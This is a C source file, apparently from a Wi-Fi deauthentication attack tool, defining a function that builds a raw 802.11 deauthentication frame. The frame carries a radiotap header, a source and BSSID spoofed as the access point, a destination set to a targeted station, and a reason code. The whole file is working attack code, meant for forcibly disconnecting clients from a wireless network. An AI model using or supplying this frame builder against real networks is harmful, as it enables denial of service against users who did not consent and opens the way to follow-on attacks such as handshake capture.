#include "deauth-attack.h"

extern Param param;

size_t InitDeauthPkt(u_char* pkt){
    radiotap_header* r_hdr_pkt =  (radiotap_header*)pkt;
    r_hdr_pkt->it_version = 0;
    r_hdr_pkt->it_pad = 0;
    r_hdr_pkt->it_len = 12;
    r_hdr_pkt->it_present = 0x00008004;
    
    IEEE80211* I802_pkt = (IEEE80211*)(pkt + r_hdr_pkt->it_len);
    I802_pkt->type = htons(0xc000);
    I802_pkt->duration = 0x13a;
    memcpy(I802_pkt->dmac, (uint8_t*)Mac(param.station), 6);
    memcpy(I802_pkt->smac, (uint8_t*)Mac(param.ap), 6);
    memcpy(I802_pkt->BSSID, (uint8_t*)Mac(param.ap), 6);
    I802_pkt->frag_seqnum = 0;

    *(pkt + r_hdr_pkt->it_len + sizeof(IEEE80211)) = 0x07;

    return r_hdr_pkt->it_len + sizeof(IEEE80211) + 2;
}